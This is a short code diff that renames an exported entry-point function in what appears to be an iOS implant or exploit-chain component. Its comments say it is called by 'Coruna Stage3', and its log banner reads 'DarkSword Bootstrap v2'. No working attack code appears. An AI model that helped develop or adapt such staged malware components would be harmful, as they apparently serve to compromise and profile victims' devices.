@@ -414,7 +414,7 @@ static void collectDeviceInfo(int deviceId) {
 }
 
 // === Main Entry Point - called by Coruna Stage3 ===
-__attribute__((visibility("default"))) void _process(void) {
+__attribute__((visibility("default"))) void process(void) {
     NSLog(@"[DS] ====================================");
     NSLog(@"[DS] DarkSword Bootstrap v2 - _process()");
     NSLog(@"[DS] ====================================");
